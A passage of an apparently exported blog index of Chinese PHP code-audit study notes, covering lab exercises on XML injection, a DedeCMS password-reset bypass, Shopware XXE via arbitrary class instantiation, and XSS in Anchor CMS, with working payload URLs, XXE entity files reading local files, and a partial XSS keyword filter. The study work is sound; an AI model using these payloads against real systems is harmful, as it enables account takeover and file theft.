1var_dump(scandir(dirname(dirname(dirname(getcwd()))))) 2020.06.22 array_flip可以替换为array_reverse readfile可以替换为show_source 2020.07.02 1readfile(array_rand(array_flip(scandir(current(localeconv()))))); 2020.07.13 https://app.yinxiang.com/fx/73cc8928-dad4-4f87-b4d6-0d1e29375ee0","tags":[{"name":"web安全基础","slug":"web安全基础","permalink":"http://ca0y1h.top/tags/web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"},{"name":"无参数函数利用","slug":"无参数函数利用","permalink":"http://ca0y1h.top/tags/%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8/"}],"categories":[{"name":"web安全","slug":"web安全","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/"},{"name":"基础学习","slug":"web安全/基础学习","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"PHP代码审计——Day3","date":"2020-06-14T14:07:48.000Z","path":"code_audit/6.PHP代码审计学习——Day4/","text":"PHP代码审计学习Day4——strpos函数缺陷 0x01 False Beard 123456789101112131415161718192021class Login &#123; public function __construct($user, $pass) &#123; $this-&gt;loginViaXml($user, $pass); &#125; public function loginViaXml($user, $pass) &#123; if ( (!strpos($user, &#x27;&lt;&#x27;) || !strpos($user, &#x27;&gt;&#x27;)) &amp;&amp; (!strpos($pass, &#x27;&lt;&#x27;) || !strpos($pass, &#x27;&gt;&#x27;)) ) &#123; $format = &#x27;&lt;?xml version=&quot;1.0&quot;?&gt;&#x27; . &#x27;&lt;user v=&quot;%s&quot;/&gt;&lt;pass v=&quot;%s&quot;/&gt;&#x27;; $xml = sprintf($format, $user, $pass); $xmlElement = new SimpleXMLElement($xml); // Perform the actual login. $this-&gt;login($xmlElement); &#125; &#125;&#125;new Login($_POST[&#x27;username&#x27;], $_POST[&#x27;password&#x27;]); 这段程序使用格式化字符串的方式，用XML结构存储用户的登录信息，这种情况容易造成XML注入。第8行和第9行使用了strpos函数来防止用户输入的参数包含&lt;和 &gt;这个两个符号。先来看看strpos函数的定义： 在这道题目中，开发者只考虑到 strpos 函数返回 false 的情况，却忽略了匹配到的字符在首位时会返回 0 的情况，因为 false 和 0 的取反均为 true，这样就可以通过闭合&quot;的方式来注入XML。Payload如下： 1username&#x3D;&quot;&#x2F;&gt;&lt;injected-tag%20property&#x3D;&quot;&amp;password&#x3D;&lt;injected-tag&gt; 但是这段代码SimpleXMLElement并没有指定LIBXML_NOENT参数，从而不能读取外部实体，不知道在这个地方这样的XML注入能有什么危害。 0x02 实例分析 漏洞利用 首先在后台开启会员功能： 注册两个会员，并且不能设置密保问题： 在登录账号test1的情况下访问下面链接： 1http:&#x2F;&#x2F;test.com&#x2F;PHP-Audit-Labs&#x2F;Day4&#x2F;dedecmsmember&#x2F;resetpassword.php?dopost&#x3D;safequestion&amp;safequestion&#x3D;0.0&amp;safeanswer&#x3D;&amp;id&#x3D;3 burp抓包重放： 然后带着id与key访问： 1http:&#x2F;&#x2F;test.com&#x2F;PHP-Audit-Labs&#x2F;Day4&#x2F;dedecms&#x2F;member&#x2F;resetpassword.php?dopost&#x3D;getpasswd&amp;id&#x3D;3&amp;key&#x3D;PFhZR7Go 自动填充了test2，那么我们就可以任意用户密码重置。 代码分析 根据漏洞url定位到member\\resetpassword.php的safequestion操作： 1234567891011121314151617181920else if($dopost == &quot;safequestion&quot;)&#123; $mid = preg_replace(&quot;#[^0-9]#&quot;, &quot;&quot;, $id); $sql = &quot;SELECT safequestion,safeanswer,userid,email FROM #@__member WHERE mid = &#x27;$mid&#x27;&quot;; $row = $db-&gt;GetOne($sql); if(empty($safequestion)) $safequestion = &#x27;&#x27;; if(empty($safeanswer)) $safeanswer = &#x27;&#x27;; //$row[&#x27;safequestion&#x27;]:&quot;0&quot; $row[&#x27;safeanswer&#x27;]:&#x27;&#x27; if($row[&#x27;safequestion&#x27;] == $safequestion &amp;&amp; $row[&#x27;safeanswer&#x27;] == $safeanswer) &#123; sn($mid, $row[&#x27;userid&#x27;], $row[&#x27;email&#x27;], &#x27;N&#x27;); exit(); &#125; else &#123; ShowMsg(&quot;对不起，您的安全问题或答案回答错误&quot;,&quot;-1&quot;); exit(); &#125;&#125; 这里先根据传入的id参数查询对应用户的密保问题答案 、userid、 邮箱等信息,接着下面进行判断,如果传入的$safequestion与$safeanswer非空且与之前设置的相等,就进入sn()函数操作 它这里用的是 == 而非 === 来判断,所以这里是可以绕过的： 那么这里我们就可以用safequestion=0.0&amp;safeanswer=即可使$row['safequestion'] == $safequestion &amp;&amp; $row['safeanswer'] == $safeanswer)为true,进入sn()函数： 1234567891011121314151617181920212223function sn($mid,$userid,$mailto, $send = &#x27;Y&#x27;)&#123; global $db; $tptim= (60*10); $dtime = time(); $sql = &quot;SELECT * FROM #@__pwd_tmp WHERE mid = &#x27;$mid&#x27;&quot;; $row = $db-&gt;GetOne($sql); if(!is_array($row)) &#123; //发送新邮件； newmail($mid,$userid,$mailto,&#x27;INSERT&#x27;,$send); &#125; //10分钟后可以再次发送新验证码； elseif($dtime - $tptim &gt; $row[&#x27;mailtime&#x27;]) &#123; newmail($mid,$userid,$mailto,&#x27;UPDATE&#x27;,$send); &#125; //重新发送新的验证码确认邮件； else &#123; return ShowMsg(&#x27;对不起，请10分钟后再重新申请&#x27;, &#x27;login.php&#x27;); &#125;&#125; 这里代码逻辑是先根据id从dede_pwd_tmp数据表中判断是否有对应的密码记录,若账号为第一次修改密码,这里的$row就会空,进入newmail()函数,执行insert()操作： 123456789101112131415161718192021222324#uploads\\member\\resetpassword.php 73行function newmail($mid, $userid, $mailto, $type, $send)&#123; ... $randval = random(8); ... if($type == &#x27;INSERT&#x27;) &#123; $key = md5($randval); $sql = &quot;INSERT INTO `#@__pwd_tmp` (`mid` ,`membername` ,`pwd` ,`mailtime`)VALUES (&#x27;$mid&#x27;, &#x27;$userid&#x27;, &#x27;$key&#x27;, &#x27;$mailtime&#x27;);&quot;; if($db-&gt;ExecuteNoneQuery($sql)) &#123; if($send == &#x27;Y&#x27;) &#123; ... &#125; else if ($send == &#x27;N&#x27;) &#123; return ShowMsg(&#x27;稍后跳转到修改页&#x27;, $cfg_basehost.$cfg_memberurl.&quot;/resetpassword.php?dopost=getpasswd&amp;amp;id=&quot;.$mid.&quot;&amp;amp;key=&quot;.$randval); &#125; &#125; else &#123; &#125; &#125; 先生成一个8位的随机密码并赋值给$randval,然后将其用md5加密,存储到dede__pwd_tmp表中,接着到了漏洞的触发点,进入$send == 'N'的操作,将未经md5加密的$randval传给了用户。 那么这里拼接的url就为： 1http:&#x2F;&#x2F;test.com&#x2F;PHP-Audit-Labs&#x2F;Day4&#x2F;dedecms&#x2F;member&#x2F;resetpassword.php?dopost&#x3D;getpasswd&amp;id&#x3D;3&amp;key&#x3D;PFhZR7Go 继续跟进dopost=getpasswd的操作： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556else if($dopost == &quot;getpasswd&quot;)&#123; //修改密码 if(empty($id)) &#123; ShowMsg(&quot;对不起，请不要非法提交&quot;,&quot;login.php&quot;); exit(); &#125; $mid = preg_replace(&quot;#[^0-9]#&quot;, &quot;&quot;, $id); $row = $db-&gt;GetOne(&quot;SELECT * FROM #@__pwd_tmp WHERE mid = &#x27;$mid&#x27;&quot;); if(empty($row)) &#123; ShowMsg(&quot;对不起，请不要非法提交&quot;,&quot;login.php&quot;); exit(); &#125; if(empty($setp)) &#123; $tptim= (60*60*24*3); $dtime = time(); if($dtime - $tptim &gt; $row[&#x27;mailtime&#x27;]) &#123; $db-&gt;executenonequery(&quot;DELETE FROM `#@__pwd_tmp` WHERE `md` = &#x27;$id&#x27;;&quot;); ShowMsg(&quot;对不起，临时密码修改期限已过期&quot;,&quot;login.php&quot;); exit(); &#125; require_once(dirname(__FILE__).&quot;/templets/resetpassword2.htm&quot;); &#125; elseif($setp == 2) &#123; if(isset($key)) $pwdtmp = $key; $sn = md5(trim($pwdtmp)); if($row[&#x27;pwd&#x27;] == $sn) &#123; if($pwd != &quot;&quot;) &#123; if($pwd == $pwdok) &#123; $pwdok = md5($pwdok); $sql = &quot;DELETE FROM `#@__pwd_tmp` WHERE `mid` = &#x27;$id&#x27;;&quot;; $db-&gt;executenonequery($sql); $sql = &quot;UPDATE `#@__member` SET `pwd` = &#x27;$pwdok&#x27; WHERE `mid` = &#x27;$id&#x27;;&quot;; if($db-&gt;executenonequery($sql)) &#123; showmsg(&#x27;更改密码成功，请牢记新密码&#x27;, &#x27;login.php&#x27;); exit; &#125; &#125; &#125; showmsg(&#x27;对不起，新密码为空或填写不一致&#x27;, &#x27;-1&#x27;); exit; &#125; showmsg(&#x27;对不起，临时密码错误&#x27;, &#x27;-1&#x27;); exit; &#125;&#125; 这里先判断id是否执行过重置密码的操作如果没有则退出，接着进入了empty($setp)的操作，判断是否超过修改期限，最后包含了resetpassword2.htm： 页面设置了setp为2，进入$setp == 2的操作，这里判断了$sn与dede_pwd_tmp的pwd值($key)是否相等,因为 $sn=md5($randval)=$row['pwd']，这样就可以重置密码了。 0x03 练习题 题目链接: https://pan.baidu.com/s/1pHjOVK0Ib-tjztkgBxe3nQ 密码: 59t2 这道题之前做过，问题出现在api.php中的buy函数： 123456789101112131415function buy($req)&#123; require_registered(); require_min_money(2); $money = $_SESSION[&#x27;money&#x27;]; $numbers = $req[&#x27;numbers&#x27;]; $win_numbers = random_win_nums(); $same_count = 0; for($i=0; $i&lt;7; $i++)&#123; if($numbers[$i] == $win_numbers[$i])&#123; $same_count++; &#125; &#125; ......&#125; 关键点在第10行代码，它使用==进行比较，而语言定义，除了 0、false、null 以外均为 true ，所以使用 true 和数字进行比较，返回的值肯定是 true，所以我们抓包修改数据提交7个true，如下图：","tags":[{"name":"代码审计","slug":"代码审计","permalink":"http://ca0y1h.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"categories":[{"name":"代码审计","slug":"代码审计","permalink":"http://ca0y1h.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"PHP","slug":"代码审计/PHP","permalink":"http://ca0y1h.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/"}]},{"title":"PHP代码审计学习——Day3","date":"2020-06-13T16:25:39.000Z","path":"code_audit/5.PHP代码审计学习——Day3/","text":"PHP代码审计学习Day3——实例化任意对象漏洞 0x01 Snow flake 代码如下： 123456789101112131415161718192021222324252627282930function __autoload($className) &#123; include $className;&#125;$controllerName = $_GET[&#x27;c&#x27;];$data = $_GET[&#x27;d&#x27;];if (class_exists($controllerName)) &#123; $controller = new $controllerName($data); $controller-&gt;render();&#125; else &#123; echo &#x27;There is no page with this name&#x27;;&#125;class HomeController &#123; private $data; public function __construct($data) &#123; $this-&gt;data = $data; &#125; public function render() &#123; if ($this-&gt;data[&#x27;new&#x27;]) &#123; echo &#x27;controller rendering new response&#x27;; &#125; else &#123; echo &#x27;controller rendering old response&#x27;; &#125; &#125;&#125; class_exist()文件包含漏洞 首先来看class_exist()的定义： class_exists ：(PHP 4, PHP 5, PHP 7) 功能 ：检查类是否已定义 定义 ： bool class_exists ( string $class_name[, bool $autoload = true ] ) $class_name 为类的名字，在匹配的时候不区分大小写。默认情况下 $autoload 为 true ，当 $autoload 为 true 时，会自动加载本程序中的 __autoload 函数；当 $autoload 为 false 时，则不调用 __autoload 函数。 上面这个例子中，class_exist()会直接调用__autoload()函数，而__autoload()函数的参数可以用户可控的，攻击者可以使用路径穿越来包含任意文件。 使用路径穿越符号的前提是PHP版本小于5.4 SimpleXMLElementXXE漏洞 第9行代码中，实例化类的类名和参数均在用户控制之下，那么攻击者就可以通过这个漏洞，调用PHP代码库的任意构造函数。也可以使用PHP内置类SimpleXMLElement进行XXE攻击，进而读取文件内容和命令执行（PHP安装expect扩展）。 SimpleXMLElement ：(PHP 5, PHP 7) 功能 ：用来表示XML文档中的元素，为PHP的内置类。 用法也比较简单，直接传入一个包含恶意payload的XML代码即可。 12345678910&lt;?php$xml = &lt;&lt;&lt;EOF&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe SYSTEM &quot;file:///E:/phpStudy/PHPTutorial/flag.txt&quot;&gt;]&gt;&lt;x&gt;&amp;xee&lt;/x&gt;EOF;$xml_class = new SimpleXMLElement($xml, LIBXML_NOENT);var_dump($xml_class); 0x02 实例分析 这次的实例分析用到的是Shopware 5.3.3版本，后台代码其中有一处提供了动态新建类的函数，然而并没有对新建的类进行限制，由于新建的类名和传递的参数都是我们可以控制的，从而造成漏洞。入口点是在engine\\Shopware\\Controllers\\Backend\\ProductStream.php文件中有一个loadPreviewAction方法，作用是用来浏览产品流的详细信息。 12345678910111213141516171819202122232425class Shopware_Controllers_Backend_ProductStream extends Shopware_Controllers_Backend_Application&#123; public function loadPreviewAction() &#123; $conditions = $this-&gt;Request()-&gt;getParam(&#x27;conditions&#x27;); $conditions = json_decode($conditions, true); $sorting = $this-&gt;Request()-&gt;getParam(&#x27;sort&#x27;); $criteria = new Criteria(); /** @var RepositoryInterface $streamRepo */ $streamRepo = $this-&gt;get(&#x27;shopware_product_stream.repository&#x27;); $sorting = $streamRepo-&gt;unserialize($sorting); foreach ($sorting as $sort) &#123; $criteria-&gt;addSorting($sort); &#125; $conditions = $streamRepo-&gt;unserialize($conditions); foreach ($conditions as $condition) &#123; $criteria-&gt;addCondition($condition); &#125;&#125; 该方法接收从用户传来的参数 sort ，然后传入 Repository 类的 unserialize 方法，继续跟进unserialize()方法，实际上是调用 engine\\Shopware\\Components\\LogawareReflectionHelper.php： 1234567891011121314151617public function unserialize($serialized, $errorSource) &#123; $classes = []; foreach ($serialized as $className =&gt; $arguments) &#123; $className = explode(&#x27;|&#x27;, $className); $className = $className[0]; try &#123; $classes[] = $this-&gt;reflector-&gt;createInstanceFromNamedArguments($className, $arguments); &#125; catch (\\Exception $e) &#123; $this-&gt;logger-&gt;critical($errorSource . &#x27;: &#x27; . $e-&gt;getMessage()); &#125; &#125; return $classes; &#125; 这里的 $serialized 就是我们刚刚传入的 sort （上图第3行），程序分别从 sort 中提取出值赋给 $className 和 $arguments 变量，然后这两个变量被传入 ReflectionHelper 类的 createInstanceFromNamedArguments 方法，继续跟进这个函数： 1234567891011121314151617181920212223242526272829public function createInstanceFromNamedArguments($className, $arguments) &#123; $reflectionClass = new \\ReflectionClass($className); if (!$reflectionClass-&gt;getConstructor()) &#123; return $reflectionClass-&gt;newInstance(); &#125; $constructorParams = $reflectionClass-&gt;getConstructor()-&gt;getParameters(); $newParams = []; foreach ($constructorParams as $constructorParam) &#123; $paramName = $constructorParam-&gt;getName(); if (!isset($arguments[$paramName])) &#123; if (!$constructorParam-&gt;isOptional()) &#123; throw new \\RuntimeException(sprintf(&quot;Required constructor Parameter Missing: &#x27;$%s&#x27;.&quot;, $paramName)); &#125; $newParams[] = $constructorParam-&gt;getDefaultValue(); continue; &#125; $newParams[] = $arguments[$paramName]; &#125; return $reflectionClass-&gt;newInstanceArgs($newParams); &#125;&#125; 函数的第一行就是创建了一个反射类，而类名就是来自我们传入的sort参数。最后一句return时根据参数newInstanceArgs创建了一个新的实例对象，参数newInstanceArgs是从$arguments[$paraName]中取值，并且$arguments是用户可控的，那么当我们传入类名为SimpleXMLElement时，实例化后，会将传入的参数进行xml解析。 中间的那一段for循环，大概意思就是如果没有传入非可选参数时直接报错，没有传入非可选参数时会赋默认值。 具体的分析文章：https://www.freebuf.com/vuls/154415.html 0x03 漏洞利用 搭建这个环境花了我一天的时间，最后还是用的其他师傅已经做好的docker镜像跑起来的，但是这个环境还是没有办法调试。 环境： Windows 10 2004 Docker 2.2.0.5 搭建步骤： docker pull gaoxijiejie/shopware:okay docker run -i -t -p 8000:80 gaoxijiejie/shopware bash 当我们点击 Refresh preview 按钮时，就会调用 loadPreviewAction 方法，用BurpSuite抓到包如下： 其中主要就是sort参数的值： 1%7B%22Shopware%5C%5CBundle%5C%5CSearchBundle%5C%5CSorting%5C%5CPriceSorting%22%3A%7B%22direction%22%3A%22ASC%22%7D%7D Url解码： 1&#123;&quot;Shopware\\\\Bundle\\\\SearchBundle\\\\Sorting\\\\PriceSorting&quot;:&#123;&quot;direction&quot;:&quot;ASC&quot;&#125;&#125; 为了构造类似的payload，先来查看SimpleXMLElement类的构造函数： 1final public SimpleXMLElement::__construct ( string $data [, int $options &#x3D; 0 [, bool $data_is_url &#x3D; FALSE [, string $ns &#x3D; &quot;&quot; [, bool $is_prefix &#x3D; FALSE ]]]] ) 为了减少Payload的长度，我们要传入data_is_url=TRUE使得可以用URL传入恶意XML数据，那么Payload如下： 1&#123;&quot;SimpleXMLElement&quot;:&#123;&quot;data&quot;:&quot;http:&#x2F;&#x2F;172.19.14.43:8000&#x2F;xxe.xml&quot;,&quot;options&quot;:2,&quot;data_is_url&quot;:1,&quot;ns&quot;:&quot;&quot;,&quot;is_prefix&quot;:0&#125;&#125; xxe.xml文件内容 12345&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;C:&#x2F;phpStudy&#x2F;PHPTutorial&#x2F;WWW&#x2F;flag.txt&quot;&gt;]&gt;&lt;x&gt;&amp;xxe;&lt;&#x2F;x&gt; 当然这个是属于Blind XXE，是没有回显的，只能用外部DTD来外带数据，但是这种没能复现成功，而且也不能调试，蛮遗憾的。 0x04 练习题 12345678910111213141516171819202122// index.php&lt;?phpclass NotFound&#123; function __construct() &#123; die(&#x27;404&#x27;); &#125;&#125;spl_autoload_register( function ($class)&#123; new NotFound(); &#125;);$classname = isset($_GET[&#x27;name&#x27;]) ? $_GET[&#x27;name&#x27;] : null;$param = isset($_GET[&#x27;param&#x27;]) ? $_GET[&#x27;param&#x27;] : null;$param2 = isset($_GET[&#x27;param2&#x27;]) ? $_GET[&#x27;param2&#x27;] : null;if(class_exists($classname))&#123; $newclass = new $classname($param,$param2); var_dump($newclass); foreach ($newclass as $key=&gt;$value) echo $key.&#x27;=&gt;&#x27;.$value.&#x27;&lt;br&gt;&#x27;;&#125; 1234// f1agi3hEre.php&lt;?php$flag = &quot;HRCTF&#123;X33_W1tH_S1mpl3Xml3l3m3nt&#125;&quot;;?&gt; 根据上面的知识储备，我们在上图第18行处可以看到使用了 class_exists 函数来判断类是否存在，如果不存在的话，就会调用程序中的 __autoload 函数，但是这里没有 __autoload 函数，而是用 spl_autoload_register 注册了一个类似 __autoload 作用的函数，即这里输出404信息。 PHP 自动加载 深度总结 首先我们用GlobIterator 类搜索flag文件名字，构造方法如下： 1public GlobIterator::__construct ( string $pattern [, int $flags &#x3D; FilesystemIterator::KEY_AS_PATHNAME | FilesystemIterator::CURRENT_AS_FILEINFO ] ) 第一个参数为要搜索的文件名，第二个参数为选择文件的哪个信息作为键名，这里我们用它的默认值CURRENT_AS_FILEINFO即可，payload如下： 1http:&#x2F;&#x2F;localhost&#x2F;PHP-Audit-Labs&#x2F;Day3&#x2F;index.php?name&#x3D;GlobIterator&amp;param&#x3D;.&#x2F;*.php 第二步用SimpleXMLElement类读取flag，这里因为文件中存在&lt; &gt; &amp; ' &quot;符号，所以需要对读取的数据进行base64编码，不然会导致XML解析失败，payload： 1http:&#x2F;&#x2F;localhost&#x2F;PHP-Audit-Labs&#x2F;Day3&#x2F;index.php?name&#x3D;SimpleXMLElement&amp;para&#x3D;?name&#x3D;SimpleXMLElement&amp;param&#x3D;&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY xxe SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;E:&#x2F;phpstudy&#x2F;PHPTutorial&#x2F;WWW&#x2F;PHP-Audit-Labs&#x2F;Day3&#x2F;f1agi3hEre.php&quot;&gt;]&gt;&lt;x&gt;%26xxe;&lt;&#x2F;x&gt;&amp;para2&#x3D;2 第一个参数的内容： 1?name&#x3D;SimpleXMLElement&amp;param&#x3D;&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY xxe SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;E:&#x2F;phpstudy&#x2F;PHPTutorial&#x2F;WWW&#x2F;PHP-Audit-Labs&#x2F;Day3&#x2F;f1agi3hEre.php&quot;&gt;]&gt;&lt;x&gt;%26xxe;&lt;&#x2F;x&gt; 第二个参数实际上这里2对应的模式是 LIBXML_NOENT，因为在libxml&gt;=2.9.0以后的版本默认不开启外部实体解析，需要添加这个参数开启。","tags":[{"name":"代码审计","slug":"代码审计","permalink":"http://ca0y1h.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"categories":[{"name":"代码审计","slug":"代码审计","permalink":"http://ca0y1h.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"PHP","slug":"代码审计/PHP","permalink":"http://ca0y1h.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/"}]},{"title":"PHP代码审计学习——Day2","date":"2020-06-11T09:45:13.000Z","path":"code_audit/4.PHP代码审计学习——Day2/","text":"PHP代码审计学习——Day1 var_filter函数缺陷 0x01 Day2 - Twig 代码如下： 123456789101112131415161718192021222324252627282930313233// composer require &quot;twig/twig&quot;require &#x27;vendor/autoload.php&#x27;;class Template &#123; private $twig; public function __construct() &#123; $indexTemplate = &#x27;&lt;img &#x27; . &#x27;src=&quot;https://loremflickr.com/320/240&quot;&gt;&#x27; . &#x27;&lt;a href=&quot;&#123;&#123;link|escape&#125;&#125;&quot;&gt;Next slide &amp;raquo;&lt;/a&gt;&#x27;; // Default twig setup, simulate loading // index.html file from disk $loader = new Twig\\Loader\\ArrayLoader([ &#x27;index.html&#x27; =&gt; $indexTemplate ]); $this-&gt;twig = new Twig\\Environment($loader); &#125; public function getNexSlideUrl() &#123; $nextSlide = $_GET[&#x27;nextSlide&#x27;]; return filter_var($nextSlide, FILTER_VALIDATE_URL); &#125; public function render() &#123; echo $this-&gt;twig-&gt;render( &#x27;index.html&#x27;, [&#x27;link&#x27; =&gt; $this-&gt;getNexSlideUrl()] ); &#125;&#125;(new Template())-&gt;render(); 这段代码涉及到了PHP的模板引擎Twig，直接来简化一下代码： 1234567&lt;?php $url = filter_var($_GET[&#x27;url&#x27;], FILTER_VALIDATE_URL); var_dump($url); $url = htmlspecialchars($url); var_dump($url); echo &quot;&lt;a href=&#x27;$url&#x27;&gt; Next Slide &lt;/a&gt;&quot;;?&gt; 分别解释一下这两个函数： filter_var ：(PHP 5 &gt;= 5.2.0, PHP 7) 功能 ：使用特定的过滤器过滤一个变量 定义 ：mixed filter_var ( mixed $variable [, int $filter = FILTER_DEFAULT [, mixed $options ]] ) htmlspecialchars ：(PHP 4, PHP 5, PHP 7) 功能 ：将特殊字符转换为 HTML 实体 定义 ：string htmlspecialchars ( string $string [, int $flags = ENT_COMPAT | ENT_HTML401 [, string$encoding = ini_get(“default_charset”) [, bool $double_encode = TRUE ]]] ) 12345&gt; &amp; (&amp; 符号) &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &amp;&gt; &quot; (双引号) &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &quot;&gt; &#39; (单引号) &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &amp;apos;&gt; &lt; (小于号) &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &lt;&gt; &gt; (大于号) &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &gt; 针对这两处的过滤，我们可以考虑使用 javascript伪协议 来绕过。我们使用 payload ：?url=javascript://comment％250aalert(1) ，可以执行 alert 函数： 解释一下这个Payload： 这里的 // 在JavaScript中表示单行注释，所以后面的内容均为注释，那为什么会执行 alert 函数呢？那是因为我们这里用了字符 %0a ，该字符为换行符，所以 alert 语句与注释符 // 就不在同一行，就能执行。当然，这里我们要对 % 百分号编码成 %25 ，因为程序将浏览器发来的payload：javascript://comment％250aalert(1) 先解码成： javascript://comment%0aalert(1) 存储在变量 $url 中（上图第二行代码），然后用户点击a标签链接就会触发 alert 函数。 0x02 实例分析 今天的实例用的是 Anchor 0.9.2 版本，在该版本中，当用户访问一个不存在的URL链接时，程序会调用404模板，而这个模板则存在XSS漏洞。问题存在于404.php： 123456789&lt;?php theme_include(&#x27;header&#x27;); ?&gt; &lt;section class=&quot;content wrap&quot;&gt; &lt;h1&gt;Page not found&lt;/h1&gt; &lt;p&gt;Unfortunately, the page &lt;code&gt;/&lt;?php echo current_url(); ?&gt;&lt;/code&gt; could not be found. Your best bet is either to try the &lt;a href=&quot;&lt;?php echo base_url(); ?&gt;&quot;&gt;homepage&lt;/a&gt;, try &lt;a href=&quot;#search&quot;&gt;searching&lt;/a&gt;, or go and cry in a corner (although I don’t recommend the latter).&lt;/p&gt; &lt;/section&gt;&lt;?php theme_include(&#x27;footer&#x27;); ?&gt; current_url()将读取当前环境的SERVER['PATH_INFO']的值，然后再回显到页面上。 原文中的利用链涉及多个函数，但是我在本地环境复现进行单步调试时，却并没有进入到detect()函数中，而是直接返回了current的值，尝试了很多次也没找到复现失败的原因，这里先留一个坑。 Payload： 1http:&#x2F;&#x2F;localhost&#x2F;anchor&#x2F;index.php&#x2F;&lt;script&gt;alert(&#39;www.sec-redclub.com&#39;)&lt;&#x2F;script&gt; 0x03 防御方式 对XSS漏洞，我们最好就是过滤关键词，将特殊字符进行HTML实体编码替换，这里引用Dedecms中防御XSS的代码： 12345678910111213141516171819202122232425262728293031323334353637383940function RemoveXSS($val) &#123; $val = preg_replace(&#x27;/([\\x00-\\x08,\\x0b-\\x0c,\\x0e-\\x19])/&#x27;, &#x27;&#x27;, $val); $search = &#x27;abcdefghijklmnopqrstuvwxyz&#x27;; $search .= &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;; $search .= &#x27;1234567890!@#$%^&amp;*()&#x27;; $search .= &#x27;~`&quot;;:?+/=&#123;&#125;[]-_|\\&#x27;\\\\&#x27;; for ($i = 0; $i &lt; strlen($search); $i++) &#123; $val = preg_replace(&#x27;/(&amp;#[xX]0&#123;0,8&#125;&#x27;.dechex(ord($search[$i])).&#x27;;?)/i&#x27;, $search[$i], $val); // with a ; $val = preg_replace(&#x27;/(&amp;#0&#123;0,8&#125;&#x27;.ord($search[$i]).&#x27;;?)/&#x27;, $search[$i], $val); // with a ; &#125; $ra1 = array(&#x27;javascript&#x27;, &#x27;vbscript&#x27;, &#x27;expression&#x27;, &#x27;applet&#x27;, &#x27;meta&#x27;, &#x27;xml&#x27;, &#x27;blink&#x27;, &#x27;link&#x27;, &#x27;style&#x27;, &#x27;script&#x27;, &#x27;embed&#x27;, &#x27;object&#x27;, &#x27;iframe&#x27;, &#x27;frame&#x27;, &#x27;frameset&#x27;, &#x27;ilayer&#x27;, &#x27;layer&#x27;, &#x27;bgsound&#x27;, &#x27;title&#x27;, &#x27;base&#x27;); $ra2 = array(&#x27;onabort&#x27;, &#x27;onactivate&#x27;, &#x27;onafterprint&#x27;, &#x27;onafterupdate&#x27;, &#x27;onbeforeactivate&#x27;, &#x27;onbeforecopy&#x27;, &#x27;onbeforecut&#x27;, &#x27;onbeforedeactivate&#x27;, &#x27;onbeforeeditfocus&#x27;, &#x27;onbeforepaste&#x27;, &#x27;onbeforeprint&#x27;, &#x27;onbeforeunload&#x27;, &#x27;onbeforeupdate&#x27;, &#x27;onblur&#x27;, &#x27;onbounce&#x27;, &#x27;oncellchange&#x27;, &#x27;onchange&#x27;, &#x27;onclick&#x27;, &#x27;oncontextmenu&#x27;, &#x27;oncontrolselect&#x27;, &#x27;oncopy&#x27;, &#x27;oncut&#x27;, &#x27;ondataavailable&#x27;, &#x27;ondatasetchanged&#x27;, &#x27;ondatasetcomplete&#x27;, &#x27;ondblclick&#x27;, &#x27;ondeactivate&#x27;, &#x27;ondrag&#x27;, &#x27;ondragend&#x27;, &#x27;ondragenter&#x27;, &#x27;ondragleave&#x27;, &#x27;ondragover&#x27;, &#x27;ondragstart&#x27;, &#x27;ondrop&#x27;, &#x27;onerror&#x27;, &#x27;onerrorupdate&#x27;, &#x27;onfilterchange&#x27;, &#x27;onfinish&#x27;, &#x27;onfocus&#x27;, &#x27;onfocusin&#x27;, &#x27;onfocusout&#x27;, &#x27;onhelp&#x27;, &#x27;onkeydown&#x27;, &#x27;onkeypress&#x27;, &#x27;onkeyup&#x27;, &#x27;onlayoutcomplete&#x27;, &#x27;onload&#x27;, &#x27;onlosecapture&#x27;, &#x27;onmousedown&#x27;, &#x27;onmouseenter&#x27;, &#x27;onmouseleave&#x27;, &#x27;onmousemove&#x27;, &#x27;onmouseout&#x27;, &#x27;onmouseover&#x27;, 